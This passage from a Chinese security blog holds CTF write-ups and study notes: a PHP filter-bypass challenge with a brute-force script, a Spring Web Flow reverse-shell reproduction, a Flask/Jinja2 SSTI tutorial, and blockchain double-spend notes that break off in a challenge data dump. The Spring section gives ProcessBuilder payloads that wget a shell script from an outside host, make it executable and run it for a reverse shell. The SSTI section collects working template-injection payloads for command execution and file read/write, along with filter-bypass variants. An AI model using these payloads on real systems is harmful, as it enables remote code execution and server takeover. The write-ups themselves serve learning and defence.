<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/utils\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/show_source/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span> </code></pre>
<p> 大E了太久了忘了：</p>
<p>原题：<a href="https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP">https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP</a></p>
<p><a href="https://www.gem-love.com/ctf/1898.html">https://www.gem-love.com/ctf/1898.html</a></p>
<p><code>basename()</code> 是为了跨目录读文件</p>
<pre><code>#Author:颖奇L'Amore www.gem-love.com
import requests
for i in range (0,500):
    url = 'http://3.112.201.75:8003/index.php/config.php/{}?source'.format(hex(i).replace('0x', '%'))
    r = requests.get(url)
    if r"zer0pts" in r.text:
        print(url)
        print(r.content)
        break</code></pre>
<pre><code>%81?%73%68%6f%77%5f%73%6f%75%72%63%65=1</code></pre>
<h1 id="Spring-Xman2017原题"><a href="#Spring-Xman2017原题" class="headerlink" title="Spring(Xman2017原题)"></a>Spring(Xman2017原题)</h1><p>反弹shell</p>
<p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>
<p>1.点击页面中的超链接进入图书搜索页面，在页面中输入搜索内容进行搜索</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/1.png" alt="1"></p>
<p>2.搜索到图书点击View hotel按钮，然后点击Book hotel按钮，如果没有登录请先登录（登录名密码圈出来了，4种任意都可以登录）</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/2.png" alt="2"></p>
<p>3.进入借书页面，随意写入16位Credit Card id和Credit Card Name点击Process按钮</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/3.png" alt="3"></p>
<p>4.在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：<code>&amp;_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei</code>，shell.sh放在可以访问的服务器中，执行请求包。</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/4.png" alt="4"></p>
<p>5.查看自己虚拟机的/tmp目录下有没有成功下shell.sh,可以看到shell.sh成功下载</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/5.png" alt="5"></p>
<p>6.至此已经复现了漏洞，可是我们既然想代码执行，那我们就可以进行反弹shell操作，继续执行命令，添加payload：<code>&amp;_(new+java.lang.ProcessBuilder("/bin/chmod","777","/tmp/shell.sh")).start()=feifei</code>对shell.sh修改权限</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/6.png" alt="6"></p>
<p>7.查看虚拟机中的/tmp目录下的shell.sh有没有变成可读可写可执行权限，可以看到shell.sh权限成功变成777</p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/7.png" alt="7"></p>
<p>8.执行shell.sh文件同时监听2333端口，执行payload:<code>&amp;_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei</code></p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/8.png" alt="8"></p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/9.png" alt="9"></p>
<p>9.在监听的服务器中查看监听的2333端口有没有反弹shell，可以看到成功反弹shell，可以执行权限内任意命令。 </p>
<p><img src="/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/10.png" alt="10"></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>  升级Spring Web Flow版本到4.2.5</p>
]]></content>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞原理学习</title>
    <url>/2021/10/26/pythonsec/ssti-lou-dong-yuan-li-xue-xi/ssti-lou-dong-yuan-li-xue-xi/</url>
    <content><![CDATA[<h3 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade  velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p>
<h2 id="flask漏洞成因"><a href="#flask漏洞成因" class="headerlink" title="flask漏洞成因"></a>flask漏洞成因</h2><p>为什么说我们上面的代码会有漏洞呢，其实对于代码功底比较深的师傅，是不会存在ssti漏洞的，被一些偷懒的师傅简化了代码，所以造成了ssti。上面的代码我们本可以写成类似如下的形式。</p>
<pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
  &lt;/head&gt;
 &lt;body&gt;
      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>里面有两个参数需要我们渲染，user.name，以及title</p>
<p>我们在app.py文件里进行渲染。</p>
<pre><code>@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
   return render_template("index.html",title='Home',user=request.args.get("key"))</code></pre>
<p>也就是说，两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果我们使用render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码</p>
<pre><code>{{}}
```

主要就是这句：

```
{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre>
<h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
<p>1.过滤[]等括号</p>
<pre><code>使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}</code></pre>
<pre><code>绕过后{{"".**class**.**bases**.**getitem**(0)}}</code></pre>
<p>2.过滤了subclasses，拼凑法</p>
<pre><code>原poc{{"".**class**.**bases**[0].**subclasses**()}}</code></pre>
<pre><code>绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}</code></pre>
<p>3.过滤class</p>
<p>使用session</p>
<pre><code>poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}</code></pre>
<p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
<p>收藏的一些poc</p>
<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" alt="img"></a></p>
<h3 id="关于SSTI的python类的知识"><a href="#关于SSTI的python类的知识" class="headerlink" title="关于SSTI的python类的知识"></a>关于SSTI的python类的知识</h3><pre class=" language-Python"><code class="language-Python">>>> ''.__class__
<type 'str'>
>>> ().__class__
<type 'tuple'>
>>> [].__class__
<type 'list'>
>>> {}.__class__
<type 'dict'></code></pre>
<p><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</p>
<p>py2和py3有差<img src="/2021/10/26/pythonsec/ssti-lou-dong-yuan-li-xue-xi/ssti-lou-dong-yuan-li-xue-xi/image-20211026211149277.png" alt="image-20211026211149277"></p>
<pre class=" language-Python"><code class="language-Python">>>> ().__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> [].__class__.__bases__
(<type 'object'>,)
>>> {}.__class__.__bases__
(<type 'object'>,)

>>> [].__class__.__bases__[0]
<type 'object'></code></pre>
<p><code>__bases__</code>：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p>
<pre class=" language-Python"><code class="language-Python">>>> [].__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]
</code></pre>
<p><code>__subclasses__()</code>：查看当前类的子类</p>
<p>当然我们也可以直接用<code>object.__subclasses__()</code>，会得到和上面一样的结果。<br> 获取基类还能用还有<code>__mro__</code>，比如：</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>

<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token operator">//</span>使用索引就能获取基类了
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span></code></pre>
<h3 id="一些常用的方法"><a href="#一些常用的方法" class="headerlink" title="一些常用的方法"></a>一些常用的方法</h3><pre class=" language-python"><code class="language-python"><span class="token operator">//</span>获取基本类
<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
object

<span class="token operator">//</span>读文件
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>r<span class="token string">'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>r<span class="token string">'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token operator">//</span>写文件
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>
object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>

<span class="token operator">//</span>执行任意命令
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span>
object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span>
</code></pre>
<p>上面漏洞复现时候的payload也是很强了，用类于编程的方式来展现，不用再一个个去查索引了：</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> b<span class="token punctuation">.</span>__class__ <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__ <span class="token operator">%</span><span class="token punctuation">}</span>
    <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> b<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
      <span class="token punctuation">{</span><span class="token punctuation">{</span> b<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("id").read()'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>         <span class="token operator">//</span>poppen的参数就是要执行的命令
    <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span></code></pre>
<p>flask魔术方法归纳：</p>
<pre><code>__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用</code></pre>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
<p><a href="https://www.guildhab.top/2019/10/flask-jinja2-ssti-python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/">https://www.guildhab.top/2019/10/flask-jinja2-ssti-python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/</a></p>
]]></content>
      <tags>
        <tag>Pythonsec</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链及双花攻击原理(UTXO)学习</title>
    <url>/2021/11/15/qu-kuai-lian-ji-shuang-hua-gong-ji-yuan-li-utxo/qu-kuai-lian-ji-shuang-hua-gong-ji-yuan-li-utxo/</url>
    <content><![CDATA[<h1 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h1><p>其实并没有什么比特币，只有 UTXO：</p>
<p><a href="https://www.chainnode.com/tutorial/4381">https://www.chainnode.com/tutorial/4381</a></p>
<p>UTXO原理：</p>
<p><a href="https://www.zhihu.com/question/59913301">https://www.zhihu.com/question/59913301</a></p>
<h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><p>从零开始构建一个区块链:</p>
<p><a href="https://zhuanlan.zhihu.com/p/29875875">https://zhuanlan.zhihu.com/p/29875875</a></p>
<p>看一张交易模型：</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%8A%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86(UTXO).assets/image-20211115170900135.png" alt="image-20211115170900135"></p>
<p>区块链由区块和链构成，每次交易输出输入必须相同</p>
<h2 id="双花攻击"><a href="#双花攻击" class="headerlink" title="双花攻击"></a>双花攻击</h2><p>双花攻击是同一笔UTXO在不同交易中的花费，双花不会产生新的货币，只能把自己花出去的钱重新拿回来。</p>
<p>如何进行51% attack攻击？</p>
<p><strong>创造一条超过原始链的长度</strong></p>
<h1 id="Python2-安装-RSA"><a href="#Python2-安装-RSA" class="headerlink" title="Python2 安装 RSA"></a>Python2 安装 RSA</h1><h2 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h2><p>下载<code>ez_setup.py</code></p>
<p><a href="http://peak.telecommunity.com/dist/ez_setup.py">http://peak.telecommunity.com/dist/ez_setup.py</a></p>
<p>python2执行</p>
<p>下载<code>rsa-3.1.1-py2.7.egg</code>并复制到D:\Python27\Scripts目录下，该目录下执行</p>
<p><a href="https://pypi.org/project/rsa/3.1.1/#files">https://pypi.org/project/rsa/3.1.1/#files</a></p>
<pre><code>easy_install.exe rsa-3.1.1-py2.7.egg</code></pre>
<h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><p>1.</p>
<pre><code>sudo python ez_setup.py</code></pre>
<p>2.</p>
<pre><code>sudo easy_install rsa-3.1.1-py2.7.egg</code></pre>
<h1 id="DDCTF2018：mini-blockchain"><a href="#DDCTF2018：mini-blockchain" class="headerlink" title="DDCTF2018：mini blockchain"></a>DDCTF2018：mini blockchain</h1><p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%8A%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86(UTXO).assets/image-20211101145544001.png" alt="image-20211101145544001"></p>
<pre class=" language-json"><code class="language-json">Announcement<span class="token operator">:</span> The server has been restarted at <span class="token number">21</span><span class="token operator">:</span><span class="token number">45</span> <span class="token number">04</span>/<span class="token number">17</span>. All blockchain have been reset. View source code

hash of genesis block<span class="token operator">:</span> 3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962

the bank's addr<span class="token operator">:</span> b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b<span class="token punctuation">,</span> 
the hacker's addr<span class="token operator">:</span> a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b<span class="token punctuation">,</span> 
the shop's addr<span class="token operator">:</span> d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071

Balance of all addresses<span class="token operator">:</span><span class="token punctuation">{</span>
    <span class="token property">"d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
    <span class="token property">"b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
    <span class="token property">"a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
    <span class="token property">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
    <span class="token property">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>

All utxos<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
